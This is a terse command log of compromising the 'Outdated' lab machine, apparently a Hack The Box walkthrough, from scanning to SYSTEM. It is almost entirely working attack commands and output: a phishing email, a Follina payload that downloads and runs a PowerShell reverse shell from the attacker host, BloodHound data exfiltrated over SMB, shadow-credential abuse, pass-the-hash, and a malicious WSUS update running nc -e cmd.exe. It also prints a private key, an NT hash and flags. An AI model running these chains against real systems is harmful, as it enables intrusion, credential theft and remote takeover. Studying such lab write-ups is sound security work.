# Outdated

└──╼ [★]$ sudo nmap -sCV 10.129.229.239
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-06-22 10:04 EDT
Nmap scan report for 10.129.229.239
Host is up (0.014s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-22 22:04:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-06-22T21:53:35
|_Not valid after:  2027-06-22T21:53:35
|_ssl-date: 2026-06-22T22:05:48+00:00; +8h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-06-22T21:53:35
|_Not valid after:  2027-06-22T21:53:35
|_ssl-date: 2026-06-22T22:05:48+00:00; +8h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-06-22T21:53:35
|_Not valid after:  2027-06-22T21:53:35
|_ssl-date: 2026-06-22T22:05:48+00:00; +8h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-06-22T22:05:48+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-06-22T21:53:35
|_Not valid after:  2027-06-22T21:53:35
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|*clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-security-mode:
|   3:1:1:
|*    Message signing enabled and required
| smb2-time:
|   date: 2026-06-22T22:05:11
|_  start_date: N/A

nmap --script smtp-commands,smtp-enum-users -p25 10.129.229.239 -Pn
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-06-22 10:17 EDT
Nmap scan report for outdated.htb (10.129.229.239)
Host is up (0.013s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users:
|_  Method EXPN returned a unhandled status code.
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

rpcclient mail.outdated.htb -U outdated.htb/''%''
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient$> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $> exit

cme smb 10.129.229.239 -u 'guest' -p '' --shares
SMB         10.129.229.239  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.239  445    DC               [+] outdated.htb\guest:
SMB         10.129.229.239  445    DC               [*] Enumerated shares
SMB         10.129.229.239  445    DC               Share           Permissions     Remark
SMB         10.129.229.239  445    DC               -----           -----------     ------
SMB         10.129.229.239  445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.239  445    DC               C$                              Default share
SMB         10.129.229.239  445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.239  445    DC               NETLOGON                        Logon server share
SMB         10.129.229.239  445    DC               Shares          READ

SMB         10.129.229.239  445    DC               SYSVOL                          Logon server share
SMB         10.129.229.239  445    DC               UpdateServicesPackages                 A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
SMB         10.129.229.239  445    DC               WsusContent                     A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         10.129.229.239  445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.

cme smb 10.129.229.239 -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true

smbclient -U outdated.htb/guest%'' \\\\10.129.229.239\\shares
Try "help" to get a list of possible commands.
smb: \> ls
.                                   D        0  Mon Jun 20 11:01:33 2022
..                                  D        0  Mon Jun 20 11:01:33 2022
NOC_Reminder.pdf                   AR   106977  Mon Jun 20 11:00:32 2022

```
	9116415 blocks of size 4096. 1815228 blocks available
```

smb: \> get NOC_Reminder.pdf
getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (735.7 KiloBytes/sec) (average 735.7 KiloBytes/sec)

git clone https://github.com/chvancooten/follina.py.git

swaks --to itsupport@outdated.htb --from [yo@clickthisish.net](mailto:yo@clickthisish.net) --server mail.outdated.htb --header "Subject: Web Server Link" --body "Hi, please review this link: [http://10.10.15.206/exploit.html](http://10.10.15.206/exploit.html)"

python3 [follina.py](http://follina.py/) -t rtf -m command -c "IEX(New-Object Net.WebClient).DownloadString('[http://10.10.15.206:8000/shell.ps1](http://10.10.15.206:8000/shell.ps1)'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.206 -Port 443" -H 10.10.15.206 -P 80
Generated 'clickme.rtf' in current directory
Generated 'exploit.html' in 'www' directory
Serving payload on [http://localhost:80/exploit.html](http://localhost/exploit.html)
10.129.18.44 - - [22/Jun/2026 20:22:13] "GET /exploit.html HTTP/1.1" 200 -

python -m http.server
Serving HTTP on 0.0.0.0 port 8000 ([http://0.0.0.0:8000/](http://0.0.0.0:8000/)) ...
10.129.18.44 - - [22/Jun/2026 20:22:15] "GET /shell.ps1 HTTP/1.1" 200 -

sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.18.44 49797
Windows PowerShell running as user btables on CLIENT
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\btables\AppData\Local\Temp\SDIAG_03cb5a6f-ca66-44d3-b6cc-7bcba9025dfc>whoami
outdated\btables

PS C:\Users\btables> iwr [http://10.10.15.206:8000/SharpHound.ps1](http://10.10.15.206:8000/SharpHound.ps1) -OutFile sh.ps1
PS C:\Users\btables> Import-Module .\sh.ps1

PS C:\Windows\temp> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\programdata -ZipFileName loot

impacket-smbserver share $(pwd) -smb2support -user u -password p

net use \\10.10.15.206\share /user:u p

copy C:\programdata\20260623003643_loot.zip \\10.10.15.206\share\

net use \\10.10.15.206\share /delete

![image.png](Outdated/image.png)

PS C:\programdata> ./whisker.exe add /target:sflowers
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password FucsJ6SLijIQS2Wm
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 6ff56a24-4dd4-4eb3-ae2f-ce7d6339d2fa
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:sflowers /certificate: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 /password:"FucsJ6SLijIQS2Wm" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
PS C:\programdata> iwr -uri 10.10.15.206:8000/Rubeus.exe -outfile Rubeus.exe

echo "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" |base64 -d > sflowers.pfx

openssl pkcs12 -info -in sflowers.pfx -nodes -passin pass:'FucsJ6SLijIQS2Wm'
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
Bag Attributes
localKeyID: 01 00 00 00
friendlyName: 54860a23-033f-4ecb-8842-b43929583f9e
Microsoft CSP Name: Microsoft Enhanced RSA and AES Cryptographic Provider
Key Attributes
X509v3 Key Usage: 10
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDJgi0O9E7Ft6r5
yn1LyZkPTHXrsHnYaUSWhlHCon1IyTxii8iXPg8JfF+6UfRA6MVQnmkTitZUA5Sb
AA7jS4IQuCSHUSxm2cOFR0PO8E/3Dd77+SJXgsORm8i0IkW07wnfMK7Bamx9e/Ag
RKBdIKMF7e/EAHnuV+ea2aTPGX8wzYrdIOKjUd1Ly7KQYMOnEdNSAh5BkU5Rd25b
MbuzAsiYejx5yBF0QQFUy5VMv60WYpfOaC+qx2/ZZk7xDJF2uG+uaeCJYUN4DIBv
4xCQA/+i+OM5D2rzJCTitW57Nzws3Gcxz+Hau1BlSk7RplIAKdxFQlWzOVGGakyG
YzBFq2AFAgMBAAECggEAEKS83gBVxUTfTVRpNupGxxm0n6vq1HIVZS1g8WeEW4+r
eiQ7hCpvCYSJT5VXTEktivQaj6+m9jd5fbfqguGIs6LR+Y890Jzp5kc1lZEJucke
gsdYC8xUJOGuGRq/kSsxMIsP1A/bOB4VfkTMzgRVErdNV24GpCYEjiit0SE0/S3H
WlWgv3p4TKO7lG5raifnOgmB+/cjbDOLeo2DtZxCMAxgcGMxOinodtuZCCf9oHDa
ZWTPoXpg6qK/4WVp0HPe58HgWG6ayY1QnwB+w9kOXyShXa6/m+jhXwczMOVrv0DK
Swvz1W5a3p9R49xnY8atC7/w3Ult7MatPtBqlZoRfQKBgQDX+7pa4xxF5GwsGLrj
dVWoWcKqXN1bMCkGe7e4eyJm4icT6LpszVLy7YOc5nlP+XWU0KxyxcqaPVsWm9YC
/dBvF3ZBlYx+7hBaRqAKornKjDxnZznvmQA61RpobjL9KJnmgSkXrQjb73BChoz2
ONSBGBYDExiBxIc6Usy4OsbGSwKBgQDu1+U5zlb9ves4VKaXqoH6iz+wK5cVEiBn
fW/5U/hqlsDbQLgPYHTEEa1HP98VugMnHJsy4NNKwUeW6b+OVjUrH8g/c8M2IXYc
Z1pNd0Dtbf4mfL9VrOGANunBzTxmha1EBSdKwGSMWDytmmV9QQRBkg0IXSWH6KOm
QSE1mCDA7wKBgFhUGGhnDP8AZcS68GNpbviEjPoDNHvAfGasXfxST0VoI7cerG8m
oU+8FuEp2F7+lDmiBYSCo1Lk2MWsQZ/DkWR9Yd18fZLDZWimDXmMBxNwuptHOghk
uBVXZY9j0fJ6kkYUeGu4VjEsAOsT/74Ki82nvgjP3GvlpbASgKqvTu91AoGAIeOq
V8hqWXigLo78UFrWNImbkNCukEPRKz4GLFd40Q7w8Gs/cpcaGlPzxT9P1RJericF
8nMqJ9pC4SvrjTO4OZU54Z74XO7khmU3z/QS112bCTT8JRjxqjKgemo3nshq7FLa
32VrHurKOUvGCL637uHdTYmB8MXWqpllL+iVBSsCgYAnKE4cb/lzkMZt/FWVTSWw
RTjI9vU9Az4obwqgKsB/z7s4jgJQ3QEmJ0OOW85TFLdWwrP+OsOJhn5hDfPvzDFg
lGmkO1t0ZksdnJQc8IAuEgD7E/68pMbQuba/ECnLPII2rPRm1CM1sVfZEOULHeGN
zKEu/IB1k+WS4OChjy6FDw==
-----END PRIVATE KEY-----
PKCS7 Encrypted data: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
Certificate bag
Bag Attributes
localKeyID: 01 00 00 00
subject=CN=sflowers
issuer=CN=sflowers
-----BEGIN CERTIFICATE-----
MIICpjCCAY6gAwIBAgIIJU3PQq3EIJcwDQYJKoZIhvcNAQELBQAwEzERMA8GA1UE
AxMIc2Zsb3dlcnMwHhcNMjYwNjIzMDc0OTE3WhcNMjcwNjIzMDc0OTE3WjATMREw
DwYDVQQDEwhzZmxvd2VyczCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
AMmCLQ70TsW3qvnKfUvJmQ9MdeuwedhpRJaGUcKifUjJPGKLyJc+Dwl8X7pR9EDo
xVCeaROK1lQDlJsADuNLghC4JIdRLGbZw4VHQ87wT/cN3vv5IleCw5GbyLQiRbTv
Cd8wrsFqbH178CBEoF0gowXt78QAee5X55rZpM8ZfzDNit0g4qNR3UvLspBgw6cR
01ICHkGRTlF3blsxu7MCyJh6PHnIEXRBAVTLlUy/rRZil85oL6rHb9lmTvEMkXa4
b65p4IlhQ3gMgG/jEJAD/6L44zkPavMkJOK1bns3PCzcZzHP4dq7UGVKTtGmUgAp
3EVCVbM5UYZqTIZjMEWrYAUCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEACscU78QE
FUHbil9C+qES0F8EpGZCS72OmF9Ut6nYWem/0w2lGjQO1haIoRIcccSZyYVKKEXm
owK6hAsJn+oOIxVPuKxwYTA0A30hjAP9OrlEoYDC8PO+a7xFFAj3tOTTGDmcUETA
COZZPYpNya2UER0E4keep35eO2be1WtmG1hBeMLZUnOooh/GxPAl0JLHHIEHsu4D
uzotA1J7vQ4DyRq8H5s9JR+2rASXk9+jP3qOhmIAQSZ/I+gbNa0AEsKwf8efCVUg
Nf1TJ6CS5W9zeSyDOxxUgreMUiTFIk4ZZnctXbaqbSUB0bwLHT0THIesRnZTW8F7
XvrCE4cOCPvpgg==
-----END CERTIFICATE-----

certipy-ad auth -pfx sflowers.pfx -dc-ip 10.129.18.44 -username sflowers -domain outdated.htb -password 'FucsJ6SLijIQS2Wm'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'sflowers@outdated.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'sflowers.ccache'
[*] Wrote credential cache to 'sflowers.ccache'
[*] Trying to retrieve NT hash for 'sflowers'
[*] Got hash for 'sflowers@outdated.htb': aad3b435b51404eeaad3b435b51404ee:1fcdb1f6015dcb318cc77bb2bda14db5

evil-winrm -H '1fcdb1f6015dcb318cc77bb2bda14db5' -i 10.129.18.44 -u sflowers

*Evil-WinRM* PS C:\Users\sflowers\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\sflowers\Desktop> ls

```
Directory: C:\Users\sflowers\Desktop
```

Mode                LastWriteTime         Length Name

---

- a---- 8/3/2022 4:19 PM 514472 PsExec64.exe
-ar--- 6/22/2026 5:19 PM 34 user.txt

*Evil-WinRM* PS C:\Users\sflowers\Desktop> cat user.txt
38eed6c809fd52f76f35a1dc3153d133

PS C:\users\sflowers\Desktop> .\SharpWSUS.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d C:\programdata\nc.exe 10.10.15.206 443 -e cmd.exe"

PS C:\users\sflowers\Desktop> ./SharpWSUS.exe approve /updateid:20e6f202-97ca-4f64-b9e4-42e88c426f75 /computername:DC.outdated.htb /groupname:"Pwns”

└──╼ [★]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.18.44 54278
Microsoft Windows [Version 10.0.17763.1432]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
044566001c5df217e0463f6c1584892b